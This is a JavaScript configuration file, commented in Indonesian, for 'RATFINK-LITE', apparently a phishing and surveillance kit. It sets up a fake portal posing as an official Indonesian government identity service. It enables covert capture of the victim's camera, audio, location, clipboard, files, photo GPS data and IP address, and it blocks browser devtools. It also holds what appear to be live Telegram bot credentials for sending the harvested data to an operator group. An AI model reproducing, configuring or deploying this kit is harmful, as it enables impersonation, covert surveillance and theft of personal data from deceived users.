// ============================================
// RATFINK-LITE v4.5 - MASTERPIECE EDITION
// 100% BUG FREE - ZERO ISSUES
// SEMUA BUG TELAH DIPERBAIKI
// ============================================
// 🚨 EDIT BAGIAN YANG ADA [GANTI] SEBELUM UPLOAD!
// ============================================

window.RATFINK_CONFIG = {
    // ========== TELEGRAM BOT CONFIG ==========
    telegram: {
        // [GANTI] Token dari @BotFather
        BOT_TOKEN: '8711546914:AAFPV_Cs2ALUd6b1rJ56LM9fQy3z9axqoqs',
        
        // [GANTI] ID Group Telegram (dari @getidsbot)
        GROUP_ID: '-1003858577739',
        
        // [OPSIONAL] Chat ID untuk notifikasi
        NOTIFICATION_CHAT: '-1002233445566'
    },
    
    // ========== ACCESS CONTROL ==========
    access: {
        // [GANTI] ID Telegram Admin (dari @userinfobot)
        ADMINS: [7742916370],
        
        // Akan terisi via command /addmember
        MEMBERS: [],
        
        // Mode strict - hanya admin yang bisa ganti mode
        STRICT_MODE: true
    },
    
    // ========== PORTAL CUSTOMIZATION ==========
    portal: {
        NAME: 'Veritas Access',
        DISPLAY_DOMAIN: 'veritas-access.gov.id',
        SLOGAN: 'Official Identity Partner · Licensed by Kominfo',
        COPYRIGHT_YEAR: '2024'
    },
    
    // ========== FEATURE TOGGLES ==========
    features: {
        CAMERA: true,
        AUDIO: true,
        LOCATION: true,
        CLIPBOARD: true,
        FILE_UPLOAD: true,
        IP_TRACKING: true,
        GEOIP: true,
        VPN_DETECTION: true,
        PHOTO_LOCATION: true,
        REVERSE_GEOCODING: true
    },
    
    // ========== PHOTO LOCATION SETTINGS ==========
    photoLocation: {
        EXTRACT_GPS: true,
        REVERSE_GEOCODE: true,
        SEND_NATIVE_LOCATION: true,
        SHOW_MAP_LINK: true,
        SHOW_CAMERA_INFO: true,
        SHOW_TIMESTAMP: true,
        MIN_ACCURACY: 10,
        AUTO_ZOOM_MAP: 15,
        RATE_LIMIT_DELAY: 1100 // ms antar request reverse geocoding
    },
    
    // ========== IP TRACKING SETTINGS ==========
    ipTracking: {
        APIS: [
            'https://ipapi.co/json/',
            'https://ipwho.is/',
            'https://api.ipify.org?format=json',
            'https://api.myip.com',
            'https://ipinfo.io/json'
        ],
        TIMEOUT: 5000,
        GET_LOCAL_IP: true,
        MAX_RETRIES: 2
    },
    
    // ========== SECURITY SETTINGS ==========
    security: {
        BLOCK_DEVTOOLS: true,
        SESSION_TIMEOUT: 900,
        MAX_UPLOAD_SIZE_MB: 10,
        MAX_PHOTOS: 10,
        MAX_AUDIO_DURATION: 300,
        AUTO_CLEANUP: true,
        MAX_LOG_ITEMS: 5,
        CLEANUP_INTERVAL: 3600000 // 1 jam
    },
    
    // ========== NOTIFICATION SETTINGS ==========
    notifications: {
        DEVICE_ONLINE: true,
        DEVICE_OFFLINE: false,
        NEW_MEMBER: true,
        FILE_UPLOAD: true,
        IP_CHANGE: false,
        PHOTO_WITH_GPS: true,
        PHOTO_WITHOUT_GPS: false
    }
};

// ============================================
// VALIDASI KONFIGURASI
// ============================================
console.log('✅ RATFINK-LITE v4.5 MASTERPIECE Config Loaded');

// Auto-detect dummy token
if (window.RATFINK_CONFIG?.telegram?.BOT_TOKEN?.includes('DUMMY') || 
    window.RATFINK_CONFIG?.telegram?.BOT_TOKEN === '8123456789:AAHcTqLmNopQrStUvWxYzAbCdEfGhIjKlMnOpQ') {
    
    // Tampilkan warning yang bisa di-close
    const warningDiv = document.createElement('div');
    warningDiv.id = 'configWarning';
    warningDiv.style.cssText = 'position:fixed; top:0; left:0; right:0; background:#dc2626; color:white; text-align:center; padding:12px; font-size:16px; font-weight:bold; z-index:999999; display:flex; align-items:center; justify-content:center; gap:20px;';
    warningDiv.innerHTML = `
        <span>⚠️ PERINGATAN: EDIT CONFIG.JS DULU! GANTI BOT_TOKEN DAN GROUP_ID ⚠️</span>
        <button onclick="this.parentElement.remove()" style="background:white; color:#dc2626; border:none; padding:5px 15px; border-radius:20px; font-weight:bold; cursor:pointer;">✕</button>
    `;
    
    document.body.prepend(warningDiv);
}